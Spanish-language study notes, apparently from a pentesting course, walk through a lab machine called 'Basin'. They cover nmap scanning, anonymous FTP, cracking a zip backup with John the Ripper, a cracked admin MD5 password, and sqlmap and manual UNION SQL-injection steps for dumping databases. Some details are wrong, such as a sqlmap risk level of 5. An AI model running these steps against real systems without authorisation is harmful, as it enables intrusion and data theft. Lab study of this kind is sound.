## ② Metodología de escaneo — Repaso

### Paso 1: Descubrimiento de puertos

```bash
nmap -p- --open -T5 -sS <IP>
```

| Parámetro | Qué hace |
|---|---|
| `-p-` | Escanea todos los puertos (1-65535) |
| `--open` | Solo muestra puertos abiertos |
| `-T5` | Velocidad máxima (agresivo) |
| `-sS` | SYN scan (stealth) |

> [!important] TTL 63 = Linux
> Si el TTL es 63, el sistema operativo es Linux. Si es 128, es Windows.

### Paso 2: Enumeración de servicios

```bash
nmap -p 21,22,80 -sV -sC <IP>
```

| Puerto | Servicio | Qué buscar |
|---|---|---|
| 21 | FTP | ¿Anónimo habilitado? ¿Archivos? |
| 22 | SSH | Versión, enumeración de usuarios |
| 80 | HTTP | Web, directorios, parámetros |

### Paso 3: Si no aparecen puertos

```bash
nmap -sU <IP>  # Escaneo UDP
```

Los puertos UDP pueden dar información que TCP no muestra.

## ③ Máquina Basin — Repaso completo

### FTP anónimo

```bash
ftp <IP>
# Login: anonymous
# Password: (vacío)
```

Una vez dentro:
```bash
ls                    # Ver archivos
get backup.zip        # Descargar backup
bye                   # Salir
```

### Crackear el backup.zip

```bash
zip2john backup.zip > hash.txt    # Extraer hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  # Crackear
```

> [!warning] Cuidado con John the Ripper
> Si ya crackeaste el hash antes, John dice que ya está cargada la contraseña. Usa `john --show hash.txt` para verla.

### Obtener credenciales

El backup contiene `index.php` con credenciales hardcodeadas:
- Usuario: `admin`
- Contraseña hash MD5: `2cb22861a4a99d75c1e32a6d5f3b5e21`

Crackear con CrackStation:
```
MD5(kawerty789) = 2cb22861a4a99d75c1e32a6d5f3b5e21
```

### Login en la web

```

Contraseña: kawerty789
```

## ④ SQL Map — Automatización

### Configurar SQL Map

```bash
sqlmap -u "http://<IP>/index.php?search=car" --dbs
```

| Parámetro | Qué hace |
|---|---|
| `-u` | URL objetivo con parámetro |
| `--dbs` | Lista las bases de datos |

### Extraer tablas

```bash
sqlmap -u "http://<IP>/index.php?search=car" -D <database> --tables
```

### Extraer datos

```bash
sqlmap -u "http://<IP>/index.php?search=car" -D <database> -T <tabla> --dump
```

### Parámetros útiles de SQL Map

| Parámetro | Qué hace |
|---|---|
| `--batch` | Acepta automáticamente las opciones por defecto |
| `--cookie` | Envía cookie personalizada |
| `-r request.txt` | Usa un archivo de petición de Burp |
| `--level=5` | Nivel máximo de testing |
| `--risk=5` | Riesgo máximo (puede ser destructivo) |

## ⑤ Metodología de ataque manual — Introducción

### Por qué hacerlo manual

SQL Map es rápido pero **no enseña**. Para entender qué está pasando, hay que hacerlo a mano.

### Los pasos del ataque manual

| Paso | Qué hacemos | Herramienta |
|---|---|---|
| 0 | Detectar si hay SQLi | Comilla simple en el parámetro |
| 1 | Determinar número de columnas | `ORDER BY N` |
| 2 | Identificar columnas visibles | `UNION SELECT NULL,NULL,...` |
| 3 | Identificar tipo de datos | `UNION SELECT 'a','b','c',...` |
| 4 | Extraer datos | `UNION SELECT username,password,...` |

- **Siempre repasar la metodología** antes de meterse en chicha

- **MD5 es frágil**: cualquier hash se puede crackear con tablas
